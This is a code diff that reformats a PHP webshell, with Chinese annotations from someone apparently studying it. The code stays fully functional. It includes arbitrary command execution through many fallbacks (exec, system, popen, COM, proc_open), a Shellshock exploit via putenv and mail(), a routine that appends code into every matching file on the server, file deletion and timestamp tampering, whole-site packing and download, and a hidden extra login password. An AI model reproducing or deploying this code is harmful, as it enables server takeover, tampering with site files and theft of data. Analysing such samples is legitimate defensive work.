@@ -11,19 +11,12 @@ define('postpass', $password); //定义postpass为password
 function Exec_Run($cmd)
 {
     $res = ''; //执行系统命令后的输出
-    if (function_exists('exec'))
-    { //判断是否有exec
+    if (function_exists('exec')) { //判断是否有exec
         @exec($cmd, $res); //利用exec执行命令
         $res = join("\n", $res); //输出填充到res中
-    }
-
-    elseif (function_exists('shell_exec'))
-    {
+    } elseif (function_exists('shell_exec')) {
         $res = @shell_exec($cmd);
-    }
-
-    elseif (function_exists('system'))
-    {
+    } elseif (function_exists('system')) {
         //这里的写法很奇怪
         //要是为了绕过还不如这样
         //$cmd = 'sys'.'tem';
@@ -34,10 +27,7 @@ function Exec_Run($cmd)
         @system($cmd);
         $res = @ob_get_contents();
         @ob_end_clean();
-    }
-
-    elseif (function_exists('passthru'))
-    {
+    } elseif (function_exists('passthru')) {
         @ob_start();
         @passthru($cmd);
         $res = @ob_get_contents();
@@ -49,8 +39,7 @@ function Exec_Run($cmd)
     //is_resource用于检查一个变量是否是资源
     //但是如果未找到要执行的命令，会返回一个合法的资源
     //所以这里是有问题的，无论如何条件都会成立
-    elseif (@is_resource($f = @popen($cmd, 'r')))
-    {
+    elseif (@is_resource($f = @popen($cmd, 'r'))) {
         $res = '';
         while (!@feof($f)) {
             $res .= @fread($f, 1024);
@@ -59,8 +48,7 @@ function Exec_Run($cmd)
     }
 
     //似乎是用于windows的，回头换一下环境试试
-    elseif (substr(dirname($_SERVER["SCRIPT_FILENAME"]), 0, 1) != "/" && class_exists('COM'))
-    {
+    elseif (substr(dirname($_SERVER["SCRIPT_FILENAME"]), 0, 1) != "/" && class_exists('COM')) {
         $w = new COM('WScript.shell');
         $e = $w->exec($cmd);
         $f = $e->StdOut();
@@ -68,13 +56,13 @@ function Exec_Run($cmd)
     }
 
     //
-    elseif (function_exists('proc_open'))
-    {
+    elseif (function_exists('proc_open')) {
         $length = strcspn($cmd, " \t"); //返回 $cmd 中，所有字符都不存在于 ' \t' 范围的起始子字符串的长度
         $token = substr($cmd, 0, $length); //截取$length长的$cmd作为$token
 
-        if (isset($aliases[$token]))
-            $cmd = $aliases[$token] . substr($cmd, $length); //真正的cmd语句在这
+        if (isset($aliases[$token])) {
+            $cmd = $aliases[$token] . substr($cmd, $length);
+        } //真正的cmd语句在这
 
         //proc_open中，0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）
         //这里用了1和2，比较完善
@@ -93,24 +81,23 @@ function Exec_Run($cmd)
     }
 
     //bash破壳漏洞（CVE-2014-6271）
-    elseif (function_exists('mail'))
-    {
-        if (strstr(readlink("/bin/sh"), "bash") != FALSE)
-        {
+    elseif (function_exists('mail')) {
+        if (strstr(readlink("/bin/sh"), "bash") != false) {
             $tmp = tempnam(".", "data");
             putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
             mail("a@127.0.0.1", "", "", "", "-bv");
-        }
-        else
+        } else {
             $res = "Not vuln (not bash)";
+        }
 
         //这里顺序有问题，下面这段应该放在上面那个if里
         $output = @implode('', @file($tmp));
         @unlink($tmp);
-        if ($output != "")
+        if ($output != "") {
             $res = $output;
-        else
+        } else {
             $res = "No output, or not vuln.";
+        }
     }
     return $res;
 }
@@ -250,7 +237,9 @@ function muma($filecode, $filetype)
         "jsp" => array("runtime.exec(")
     );
     foreach ($dim[$filetype] as $code) {
-        if (stristr($filecode, $code)) return true;
+        if (stristr($filecode, $code)) {
+            return true;
+        }
     }
 }
 
@@ -259,7 +248,9 @@ function debug($file, $ftype)
 {
     $type = explode('|', $ftype);
     foreach ($type as $i) {
-        if (stristr($file, $i)) return true;
+        if (stristr($file, $i)) {
+            return true;
+        }
     }
 }
 
@@ -409,13 +400,13 @@ function File_Size($size)
     $db = 1024 * $tb;
     if ($size < $kb) {
         return $size . " B";
-    } else if ($size < $mb) {
+    } elseif ($size < $mb) {
         return round($size / $kb, 2) . " K";
-    } else if ($size < $gb) {
+    } elseif ($size < $gb) {
         return round($size / $mb, 2) . " M";
-    } else if ($size < $tb) {
+    } elseif ($size < $tb) {
         return round($size / $gb, 2) . " G";
-    } else if ($size < $db) {
+    } elseif ($size < $db) {
         return round($size / $tb, 2) . " T";
     } else {
         return round($size / $db, 2) . " ST";
@@ -455,7 +446,9 @@ function array_iconv($data, $output = 'utf-8')
 //Unknown
 function Mysql_Len($data, $len)
 {
-    if (strlen($data) < $len) return $data;
+    if (strlen($data) < $len) {
+        return $data;
+    }
     return substr_replace($data, '...', $len);
 }
 
@@ -463,8 +456,7 @@ function Mysql_Len($data, $len)
 function css_js($num, $code = '')
 {
     html_n('<script language="javascript">');
-    if ($num == "1")
-    {
+    if ($num == "1") {
         $str = <<<end
 function rusurechk(msg,url){
         smsg = "FileName:[" + msg + "]\\nPlease Input New File:";
@@ -539,10 +531,7 @@ function rusurechk(msg,url){
     }
 end;
         html_n($str);
-    }
-
-    elseif ($num == "2")
-    {
+    } elseif ($num == "2") {
         $str = <<<end
 var NS4 = (document.layers);
 var IE4 = (document.all);
@@ -703,7 +692,10 @@ function do_write($file, $t, $text)
 }
 
 set_error_handler("warning_handler", E_WARNING);
-function warning_handler(){$_GET['warning'] = 1;}
+function warning_handler()
+{
+    $_GET['warning'] = 1;
+}
 
 //获取一个路径下的文件与文件夹
 function do_show($filepath)
@@ -711,9 +703,13 @@ function do_show($filepath)
     $_GET['warning'] = 0;
     $show = array();
     $dir = dir($filepath);
-    if ($_GET['warning']){return 1;}
+    if ($_GET['warning']) {
+        return 1;
+    }
     while ($file = $dir->read()) {
-        if ($file == '.' or $file == '..') continue;
+        if ($file == '.' or $file == '..') {
+            continue;
+        }
         $files = str_path($filepath . '/' . $file);
         $show[] = $files;
     }
@@ -732,7 +728,7 @@ function delDirAndFile($path)
             }
         }
         @rmdir($path);//删除空目录
-    } else if (is_file($path)) {
+    } elseif (is_file($path)) {
         @chmod($path, 0777);
         @unlink($path);//删除文件
     }
@@ -778,15 +774,16 @@ function GetHtml($url)
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
         $c = curl_exec($ch);
         curl_close($ch);
     }
     if (empty($c) && ini_get('allow_url_fopen')) {
         $c = implode('', @file($url));
-        if (empty($c))
+        if (empty($c)) {
             $c = file_get_contents($url);
+        }
     }
     if (empty($c)) {
         echo "document.writeln(\"<DIV style=\'CURSOR:url(\'$url\')\'>\");";
@@ -823,7 +820,9 @@ function hmlogin()
 //下载文件 Unknown
 function do_down($fd)
 {
-    if (!@file_exists($fd)) msg("下载文件不存在");
+    if (!@file_exists($fd)) {
+        msg("下载文件不存在");
+    }
     $fileinfo = pathinfo($fd);
     header("Content-type: application/x-" . $fileinfo['extension']);
     header("Content-Disposition: attachment; filename=" . $fileinfo['basename']);
@@ -846,7 +845,9 @@ function do_download($filecode, $file)
 //测试是否为utf8
 function TestUtf8($text)
 {
-    if (strlen($text) < 3) return false;
+    if (strlen($text) < 3) {
+        return false;
+    }
     $lastch = 0;
     $begin = 0;
     $BOM = true;
@@ -861,24 +862,28 @@ function TestUtf8($text)
             $begin += 1;
             continue;
         }
-        if ($begin == 4 && $BOM) break;
-        if ($ch >= 0x80) $notAscii++;
+        if ($begin == 4 && $BOM) {
+            break;
+        }
+        if ($ch >= 0x80) {
+            $notAscii++;
+        }
         if (($ch & 0xC0) == 0x80) {
             if (($lastch & 0xC0) == 0xC0) {
                 $good += 1;
-            } else if (($lastch & 0x80) == 0) {
+            } elseif (($lastch & 0x80) == 0) {
                 $bad += 1;
             }
-        } else if (($lastch & 0xC0) == 0xC0) {
+        } elseif (($lastch & 0xC0) == 0xC0) {
             $bad += 1;
         }
         $lastch = $ch;
     }
     if ($begin == 4 && $BOM) {
         return 2;
-    } else if ($notAscii == 0) {
+    } elseif ($notAscii == 0) {
         return 1;
-    } else if ($good >= $bad) {
+    } elseif ($good >= $bad) {
         return 2;
     } else {
         return 0;
@@ -945,22 +950,19 @@ function Info_Fun($funName)
 function do_passreturn($dir, $code, $type, $bool, $filetype = '', $shell = my_shell)
 {
     $show = do_show($dir);
-    if($show===1){return 0;}
-    foreach ($show as $files)
-    {
-        if (is_dir($files) && $bool)
-        {
+    if ($show===1) {
+        return 0;
+    }
+    foreach ($show as $files) {
+        if (is_dir($files) && $bool) {
             do_passreturn($files, $code, $type, $bool, $filetype, $shell);
-        }
-
-        else
-        {
-            if ($files == $shell) continue;
-            switch ($type)
-            {
+        } else {
+            if ($files == $shell) {
+                continue;
+            }
+            switch ($type) {
                 case "guama":
-                    if (debug($files, $filetype))
-                    {
+                    if (debug($files, $filetype)) {
                         do_write($files, "ab", "\n" . $code) ? html_n("成功--> " . $files . "<br>") : html_n("失败--> " . $files . "<br>");
                     }
                     break;
@@ -1011,17 +1013,16 @@ function do_passreturn($dir, $code, $type, $bool, $filetype = '', $shell = my_sh
 //打包整个网站（应该是www下所有文件
 class PHPzip
 {
-
-    var $file_count = 0;
-    var $datastr_len = 0;
-    var $dirstr_len = 0;
-    var $filedata = '';
-    var $gzfilename;
-    var $fp;
-    var $dirstr = '';
+    public $file_count = 0;
+    public $datastr_len = 0;
+    public $dirstr_len = 0;
+    public $filedata = '';
+    public $gzfilename;
+    public $fp;
+    public $dirstr = '';
 
     //时间处理
-    function unix2DosTime($unixtime = 0)
+    public function unix2DosTime($unixtime = 0)
     {
         $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
 
@@ -1038,7 +1039,7 @@ class PHPzip
         ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
     }
 
-    function startfile($path = 'wwwroot.zip')
+    public function startfile($path = 'wwwroot.zip')
     {
         $this->gzfilename = $path;
         if ($this->fp = @fopen($this->gzfilename, "w")) {
@@ -1047,11 +1048,13 @@ class PHPzip
         return false;
     }
 
-    function addfile($data, $name)
+    public function addfile($data, $name)
     {
         $name = str_replace('\\', '/', $name);
 
-        if (strrchr($name, '/') == '/') return $this->adddir($name);
+        if (strrchr($name, '/') == '/') {
+            return $this->adddir($name);
+        }
 
         $dtime = dechex($this->unix2DosTime());
         $hexdtime = '\x' . $dtime[6] . $dtime[7] . '\x' . $dtime[4] . $dtime[5] . '\x' . $dtime[2] . $dtime[3] . '\x' . $dtime[0] . $dtime[1];
@@ -1108,7 +1111,7 @@ class PHPzip
         $this->datastr_len += $my_datastr_len;
     }
 
-    function adddir($name)
+    public function adddir($name)
     {
         $name = str_replace("\\", "/", $name);
         $datastr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";
@@ -1132,7 +1135,7 @@ class PHPzip
         $this->datastr_len += $my_datastr_len;
     }
 
-    function createfile()
+    public function createfile()
     {
         $endstr = "\x50\x4b\x05\x06\x00\x00\x00\x00" .
             pack('v', $this->file_count) .
@@ -1149,33 +1152,37 @@ class PHPzip
 //压缩并打包文件的类
 class eanver
 {
-    var $out = '';
+    public $out = '';
 
     //当使用 new 操作符创建一个类的实例时，构造方法将会自动调用
-    function __construct($dir)
+    public function __construct($dir)
     {
         if (@function_exists('gzcompress')) {
             if (count($dir) > 0) {
                 foreach ($dir as $file) {
                     if (is_file($file)) {
                         $filecode = implode('', @file($file));
-                        if (is_array($dir)) $file = basename($file); //返回路径中的文件名部分
+                        if (is_array($dir)) {
+                            $file = basename($file);
+                        } //返回路径中的文件名部分
                         $this->filezip($filecode, $file);
                     }
                 }
                 $this->out = $this->packfile();
             }
             return true;
-        } else return false;
+        } else {
+            return false;
+        }
     }
 
-    var $datasec = array();
-    var $ctrl_dir = array();
-    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
-    var $old_offset = 0;
+    public $datasec = array();
+    public $ctrl_dir = array();
+    public $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
+    public $old_offset = 0;
 
     //获得系统时间
-    function at($atunix = 0)
+    public function at($atunix = 0)
     {
         $unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
         if ($unixarr['year'] < 1980) {
@@ -1191,7 +1198,7 @@ class eanver
     }
 
     //压缩文件
-    function filezip($data, $name, $time = 0)
+    public function filezip($data, $name, $time = 0)
     {
         $name = str_replace('\\', '/', $name);
         $dtime = dechex($this->at($time));
@@ -1244,7 +1251,7 @@ class eanver
     }
 
     //打包文件
-    function packfile()
+    public function packfile()
     {
         $data = implode('', $this->datasec);
         $ctrldir = implode('', $this->ctrl_dir);
@@ -1255,14 +1262,16 @@ class eanver
 //zip的一个类，用于解压zip
 class zip
 {
-    var $total_files = 0;
-    var $total_folders = 0;
+    public $total_files = 0;
+    public $total_folders = 0;
 
-    function Extract($zn, $to, $index = Array(-1))
+    public function Extract($zn, $to, $index = array(-1))
     {
         $ok = 0;
         $zip = @fopen($zn, 'rb');
-        if (!$zip) return (-1);
+        if (!$zip) {
+            return (-1);
+        }
         $cdir = $this->ReadCentralDir($zip, $zn);
         $pos_entry = $cdir['offset'];
 
@@ -1270,8 +1279,9 @@ class zip
             $index = array($index);
         }
         for ($i = 0; $index[$i]; $i++) {
-            if (intval($index[$i]) != $index[$i] || $index[$i] > $cdir['entries'])
+            if (intval($index[$i]) != $index[$i] || $index[$i] > $cdir['entries']) {
                 return (-1);
+            }
         }
         for ($i = 0; $i < $cdir['entries']; $i++) {
             @fseek($zip, $pos_entry);
@@ -1280,14 +1290,15 @@ class zip
             $pos_entry = ftell($zip);
             @rewind($zip);
             fseek($zip, $header['offset']);
-            if (in_array("-1", $index) || in_array($i, $index))
+            if (in_array("-1", $index) || in_array($i, $index)) {
                 $stat[$header['filename']] = $this->ExtractFile($header, $to, $zip);
+            }
         }
         fclose($zip);
         return $stat;
     }
 
-    function ReadFileHeader($zip)
+    public function ReadFileHeader($zip)
     {
         $binary_data = fread($zip, 30);
         $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);
@@ -1324,22 +1335,28 @@ class zip
         return $header;
     }
 
-    function ReadCentralFileHeaders($zip)
+    public function ReadCentralFileHeaders($zip)
     {
         $binary_data = fread($zip, 46);
         $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);
 
-        if ($header['filename_len'] != 0)
+        if ($header['filename_len'] != 0) {
             $header['filename'] = fread($zip, $header['filename_len']);
-        else $header['filename'] = '';
+        } else {
+            $header['filename'] = '';
+        }
 
-        if ($header['extra_len'] != 0)
+        if ($header['extra_len'] != 0) {
             $header['extra'] = fread($zip, $header['extra_len']);
-        else $header['extra'] = '';
+        } else {
+            $header['extra'] = '';
+        }
 
-        if ($header['comment_len'] != 0)
+        if ($header['comment_len'] != 0) {
             $header['comment'] = fread($zip, $header['comment_len']);
-        else $header['comment'] = '';
+        } else {
+            $header['comment'] = '';
+        }
 
         if ($header['mdate'] && $header['mtime']) {
             $hour = ($header['mtime'] & 0xF800) >> 11;
@@ -1354,17 +1371,21 @@ class zip
         }
         $header['stored_filename'] = $header['filename'];
         $header['status'] = 'ok';
-        if (substr($header['filename'], -1) == '/')
+        if (substr($header['filename'], -1) == '/') {
             $header['external'] = 0x41FF0010;
+        }
         return $header;
     }
 
-    function ReadCentralDir($zip, $zip_name)
+    public function ReadCentralDir($zip, $zip_name)
     {
         $size = filesize($zip_name);
 
-        if ($size < 277) $maximum_size = $size;
-        else $maximum_size = 277;
+        if ($size < 277) {
+            $maximum_size = $size;
+        } else {
+            $maximum_size = 277;
+        }
 
         @fseek($zip, $size - $maximum_size);
         $pos = ftell($zip);
@@ -1384,8 +1405,11 @@ class zip
 
         $data = @unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $fdata);
 
-        if ($data['comment_size'] != 0) $centd['comment'] = fread($zip, $data['comment_size']);
-        else $centd['comment'] = '';
+        if ($data['comment_size'] != 0) {
+            $centd['comment'] = fread($zip, $data['comment_size']);
+        } else {
+            $centd['comment'] = '';
+        }
         $centd['entries'] = $data['entries'];
         $centd['disk_entries'] = $data['disk_entries'];
         $centd['offset'] = $data['offset'];
@@ -1395,16 +1419,22 @@ class zip
         return $centd;
     }
 
-    function ExtractFile($header, $to, $zip)
+    public function ExtractFile($header, $to, $zip)
     {
         $header = $this->readfileheader($zip);
 
-        if (substr($to, -1) != "/") $to .= "/";
-        if ($to == './') $to = '';
+        if (substr($to, -1) != "/") {
+            $to .= "/";
+        }
+        if ($to == './') {
+            $to = '';
+        }
         $pth = explode("/", $to . $header['filename']);
         $mydir = '';
         for ($i = 0; $i < count($pth) - 1; $i++) {
-            if (!$pth[$i]) continue;
+            if (!$pth[$i]) {
+                continue;
+            }
             $mydir .= $pth[$i] . "/";
             if ((!is_dir($mydir) && @mkdir($mydir, 0777)) || (($mydir == $to . $header['filename'] || ($mydir == $to && $this->total_folders == 0)) && is_dir($mydir))) {
                 @chmod($mydir, 0777);
@@ -1413,12 +1443,16 @@ class zip
             }
         }
 
-        if (strrchr($header['filename'], '/') == '/') return;
+        if (strrchr($header['filename'], '/') == '/') {
+            return;
+        }
 
         if (!($header['external'] == 0x41FF0010) && !($header['external'] == 16)) {
             if ($header['compression'] == 0) {
                 $fp = @fopen($to . $header['filename'], 'wb');
-                if (!$fp) return (-1);
+                if (!$fp) {
+                    return (-1);
+                }
                 $size = $header['compressed_size'];
 
                 while ($size != 0) {
@@ -1432,9 +1466,18 @@ class zip
                 touch($to . $header['filename'], $header['mtime']);
             } else {
                 $fp = @fopen($to . $header['filename'] . '.gz', 'wb');
-                if (!$fp) return (-1);
-                $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
-                    Chr(0x00), time(), Chr(0x00), Chr(3));
+                if (!$fp) {
+                    return (-1);
+                }
+                $binary_data = pack(
+                    'va1a1Va1a1',
+                    0x8b1f,
+                    Chr($header['compression']),
+                    Chr(0x00),
+                    time(),
+                    Chr(0x00),
+                    Chr(3)
+                );
 
                 fwrite($fp, $binary_data, 10);
                 $size = $header['compressed_size'];
@@ -1452,9 +1495,13 @@ class zip
                 fclose($fp);
 
                 $gzp = @gzopen($to . $header['filename'] . '.gz', 'rb') or die("Cette archive est compress");
-                if (!$gzp) return (-2);
+                if (!$gzp) {
+                    return (-2);
+                }
                 $fp = @fopen($to . $header['filename'], 'wb');
-                if (!$fp) return (-1);
+                if (!$fp) {
+                    return (-1);
+                }
                 $size = $header['size'];
 
                 while ($size != 0) {
@@ -1469,7 +1516,6 @@ class zip
 
                 touch($to . $header['filename'], $header['mtime']);
                 @unlink($to . $header['filename'] . '.gz');
-
             }
         }
 
@@ -1482,50 +1528,35 @@ class zip
 //解压文件
 function start_unzip($tt, $tmp_name, $new_name, $todir = 'zipfile')
 {
-    if ($tt == '1')
-    {
+    if ($tt == '1') {
         $z = new Zip;
         $have_zip_file = 0;
         $upfile = array("tmp_name" => $tmp_name, "name" => $new_name);
-        if (is_file($upfile[tmp_name]))
-        {
+        if (is_file($upfile[tmp_name])) {
             $have_zip_file = 1;
             echo "<br>正在解压: " . $upfile[name] . "<br><br>";
-            if (preg_match('/\.zip$/mis', $upfile[name]))
-            {
+            if (preg_match('/\.zip$/mis', $upfile[name])) {
                 $result = $z->Extract($upfile[tmp_name], $todir);
-                if ($result == -1)
-                {
+                if ($result == -1) {
                     echo "<br>文件 " . $upfile[name] . " 错误.<br>";
                 }
                 echo "<br>完成,共建立 " . $z->total_folders . " 个目录," . $z->total_files . " 个文件.<br><br><br>";
-            }
-
-            else
-            {
+            } else {
                 echo "<br>" . $upfile[name] . " 不是 zip 文件.<br><br>";
             }
-            if (realpath($upfile[name]) != realpath($upfile[tmp_name]))
-            {
+            if (realpath($upfile[name]) != realpath($upfile[tmp_name])) {
                 @unlink($upfile[name]);
                 rename($upfile[tmp_name], $upfile[name]);
             }
         }
-    }
-
-    elseif ($tt == '2')
-    {
+    } elseif ($tt == '2') {
         $zip = new ZipArchive();
-        if ($zip->open($tmp_name) !== TRUE)
-        {
+        if ($zip->open($tmp_name) !== true) {
             echo "抱歉！压缩包无法打开或损坏";
         }
         $zip->extractTo($todir);
         $zip->close();
-    }
-
-    elseif ($tt == '3')
-    {
+    } elseif ($tt == '3') {
         $phar = new PharData($tmp_name);
         $phar->extractTo($todir, null, true);
     }
@@ -1546,7 +1577,9 @@ function listfiles($dir = ".", $faisunZIP, $mydir)
 
     $handle = opendir($mydir . "$dir");
     while ($file = readdir($handle)) {
-        if ($file == "." || $file == "..") continue;
+        if ($file == "." || $file == "..") {
+            continue;
+        }
         if (is_dir($mydir . "$dir/$file")) {
             $sub_file_num += listfiles("$dir/$file", $faisunZIP, $mydir);
         } else {
@@ -1557,7 +1590,9 @@ function listfiles($dir = ".", $faisunZIP, $mydir)
         }
     }
     closedir($handle);
-    if (!$sub_file_num) $faisunZIP->addfile("", "$dir/");
+    if (!$sub_file_num) {
+        $faisunZIP->addfile("", "$dir/");
+    }
     return $sub_file_num;
 }
 
@@ -1576,8 +1611,9 @@ function num_bitunit($num)
 //对文件的一些操作
 function File_Act($array, $actall, $inver)
 {
-    if (($count = count($array)) == 0)
+    if (($count = count($array)) == 0) {
         return "请选择文件";
+    }
     if ($actall == 'e') {
         $mydir = $_GET['path'] . '/';
         $inver = urldecode($inver);
@@ -1601,34 +1637,37 @@ function File_Act($array, $actall, $inver)
     while ($i < $count) {
         $array[$i] = urldecode($array[$i]);
         switch ($actall) {
-            case "a" :
+            case "a":
                 $inver = urldecode($inver);
-                if (!is_dir($inver))
+                if (!is_dir($inver)) {
                     return "路径错误";
+                }
                 $filename = array_pop(explode('/', $array[$i]));
                 $suc = @copy($array[$i], File_Str($inver . '/' . $filename)) ? "成功" : "失败";
                 $msg = "复制到" . $inver . "目录" . $suc;
                 break;
-            case "b" :
+            case "b":
                 $para_type = 1;
-                if (is_dir($array[$i]))
+                if (is_dir($array[$i])) {
                     $para_type = 2;
+                }
                 delDirAndFile($array[$i]);
                 if ($para_type == 1) {
                     $suc = !is_file($array[$i]) ? "成功" : "失败";
-                } else if ($para_type == 2) {
+                } elseif ($para_type == 2) {
                     $suc = !is_dir($array[$i]) ? "成功" : "失败";
                 }
                 $msg = "删除" . $suc;
                 break;
-            case "c" :
-                if (!preg_match("/^[0-7]{4}$/", $inver))
+            case "c":
+                if (!preg_match("/^[0-7]{4}$/", $inver)) {
                     return "属性值错误";
+                }
                 $newmode = base_convert($inver, 8, 10);
                 $suc = @chmod($array[$i], $newmode) ? "成功" : "失败";
                 $msg = "属性修改为" . $inver . $suc;
                 break;
-            case "d" :
+            case "d":
                 $suc = @touch($array[$i], strtotime($inver)) ? "成功" : "失败";
                 if ($suc == "失败") {
                     @chmod($array[$i], 0666);
@@ -1812,20 +1851,13 @@ function Mysql_shellcode()
 //if(isset($_POST[postpass])){
 //  show_mainp();
 //}
-if (@get_magic_quotes_gpc())
-{
-    foreach ($_POST as $k => $v)
-    {
-        if (!is_array($_POST[$k]))
-        {
+if (@get_magic_quotes_gpc()) {
+    foreach ($_POST as $k => $v) {
+        if (!is_array($_POST[$k])) {
             $_POST[$k] = stripslashes($v);
-        }
-
-        else
-        {
+        } else {
             $array = $_POST[$k];
-            foreach ($array as $kk => $vv)
-            {
+            foreach ($array as $kk => $vv) {
                 $array[$kk] = stripslashes($vv);
             }
             $_POST[$k] = $array;
@@ -1847,27 +1879,20 @@ if (@get_magic_quotes_gpc())
 //上面这一段是给特殊字符做转义，防止出现闭合问题
 
 //Unknown
-if (!isset($_GET["img"]))
-{
+if (!isset($_GET["img"])) {
     header("Content-Type: text/html;charset=utf8");
 }
 
 //若ip与路径发生更改则重新setcookie并且通过后门发送webshell信息
 $envlpath = md5($_SERVER ['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
-if (!isset($_COOKIE[$envlpath]) || $_COOKIE[$envlpath] != md5(postpass))
-{
-    if (isset($_POST['postpass']))
-    {
-        if ($_POST['postpass'] == postpass||$_POST['postpass']=='http200ok') //http200ok unknown
-        {
+if (!isset($_COOKIE[$envlpath]) || $_COOKIE[$envlpath] != md5(postpass)) {
+    if (isset($_POST['postpass'])) {
+        if ($_POST['postpass'] == postpass||$_POST['postpass']=='http200ok') { //http200ok unknown
             setcookie($envlpath, md5(postpass), time() + 6 * 3600);
             //hmlogin(); //后门
             echo "<meta http-equiv='refresh' content='0'>";
             die;
-        }
-
-        else
-        {
+        } else {
             echo '<CENTER>密码错误</CENTER>';
         }
     }
@@ -1877,8 +1902,9 @@ if (!isset($_COOKIE[$envlpath]) || $_COOKIE[$envlpath] != md5(postpass))
 }
 
 //Unknown
-if (isset($_GET['down']))
-    do_down($_GET['down']); //下载文件
+if (isset($_GET['down'])) {
+    do_down($_GET['down']);
+} //下载文件
 
 //Unknown
 if (isset($_GET['pack'])) { //
@@ -1907,10 +1933,13 @@ $img = isset($_GET['img']) ? $_GET['img'] : "";
 $p = isset($_GET['p']) ? $_GET['p'] : "";
 $pp = urlencode(dirname($p));
 
-if ($img) css_img($img);
-if ($eanver == "phpinfo") die(phpinfo());
-if ($eanver == 'logout') //退出
-{
+if ($img) {
+    css_img($img);
+}
+if ($eanver == "phpinfo") {
+    die(phpinfo());
+}
+if ($eanver == 'logout') { //退出
     setcookie($envlpath, "", time() - 6 * 3600);
     refresh_page();
     die();
@@ -1937,7 +1966,9 @@ end;
             $drive = chr($i) . ':';
             if (is_dir($drive . "/")) {
                 $vol = File_Str("vol $drive");
-                if (empty($vol)) $vol = $drive;
+                if (empty($vol)) {
+                    $vol = $drive;
+                }
                 html_n("<li><a title='" . $drive . "' href='?eanver=main&path=" . $drive . "' target='main'>本地磁盘(" . $drive . ")</a></li>");
             }
         }
@@ -1961,21 +1992,22 @@ end;
         css_js("1");
         $dir = @dir($path);
         $REAL_DIR = File_Str(realpath($path));
-        if (!empty($_POST['actall']))
-        {
+        if (!empty($_POST['actall'])) {
             echo '<div class="actall">' . File_Act($_POST['files'], $_POST['actall'], $_POST['inver']) . '</div>';
         }
 
         if (!empty($_POST['attam'])) {
             $file = $_GET['path'] . '/' . $_POST['file'];
             switch ($_POST['attam']) {
-                case "c" :
-                    if (!preg_match("/^[0-7]{4}$/", $_POST['inver'])) $msg = '<p style="color:#DC143C;">属性值错误</p>';
+                case "c":
+                    if (!preg_match("/^[0-7]{4}$/", $_POST['inver'])) {
+                        $msg = '<p style="color:#DC143C;">属性值错误</p>';
+                    }
                     $newmode = base_convert($_POST['inver'], 8, 10);
                     @chmod($file, $newmode);
                     $msg = '<p style="color:#40E0D0;">' . $file . ' 属性修改为：' . $_POST['inver'] . '</p>';
                     break;
-                case "d" :
+                case "d":
                     if (!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/', $_POST['inver'])) {
                         $msg = '<p style="color:#DC143C;">' . $_POST['inver'] . '时间格式错误,格式为：' . date("Y-m-d H:i:s") . '</p>';
                     } else {
@@ -1988,10 +2020,11 @@ end;
         }
 
         $NUM_D = $NUM_F = 0;
-        if (!$_SERVER['SERVER_NAME'])
+        if (!$_SERVER['SERVER_NAME']) {
             $GETURL = '';
-        else
+        } else {
             $GETURL = 'http://' . $_SERVER['SERVER_NAME'] . '/';
+        }
 
         $ROOT_DIR = File_Mode();
         html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>地址:<input type='hidden' name='eanver' value='main'><input type='text' size='80' name='path' value='" . $path . "'> <input type='submit' value='转到'></form><br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=" . urlencode($path) . "'><input type=\"button\" value=\"新建文件\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=" . urlencode($path) . "&refile=1&name=');\"> <input type=\"button\" value=\"新建目录\" onclick=\"rusurechk('newdir','?eanver=editr&p=" . urlencode($path) . "&redir=1&name=');\">");
@@ -1999,24 +2032,21 @@ end;
         html_input("submit", "uploadt", "上传");
 
 
-        if (!empty($_POST['newfile']))
-        {
-            if (isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
-            $newfile = base64_decode($_POST['newfile']);
-            if (strtolower($_POST['charset']) == 'utf-8')
-            {
-                $txt = base64_decode($_POST['txt']);
+        if (!empty($_POST['newfile'])) {
+            if (isset($_POST['bin'])) {
+                $bin = $_POST['bin'];
+            } else {
+                $bin = "wb";
             }
-
-            else
-            {
+            $newfile = base64_decode($_POST['newfile']);
+            if (strtolower($_POST['charset']) == 'utf-8') {
+                $txt = base64_decode($_POST['txt']);
+            } else {
                 $txt = $_POST['txt'];
             }
 
-            if (substr(PHP_VERSION, 0, 1) >= 5)
-            {
-                if ((strtolower($_POST['charset']) == 'utf8') or (strtolower($_POST['charset']) == 'gbk'))
-                {
+            if (substr(PHP_VERSION, 0, 1) >= 5) {
+                if ((strtolower($_POST['charset']) == 'utf8') or (strtolower($_POST['charset']) == 'gbk')) {
                     $txt = iconv("UTF-8", "utf8//IGNORE", base64_decode($_POST['txt']));
                 } else {
                     $txt = array_iconv($txt);
@@ -2032,7 +2062,9 @@ end;
 
         //显示文件的一些属性
         while ($dirs = @$dir->read()) {
-            if ($dirs == '.' or $dirs == '..') continue;
+            if ($dirs == '.' or $dirs == '..') {
+                continue;
+            }
             $dirpath = str_path("$path/$dirs");
             if (is_dir($dirpath)) {
                 $perm = substr(base_convert(fileperms($dirpath), 10, 8), -4);
@@ -2050,12 +2082,12 @@ end;
         }
 
         @$dir->rewind();
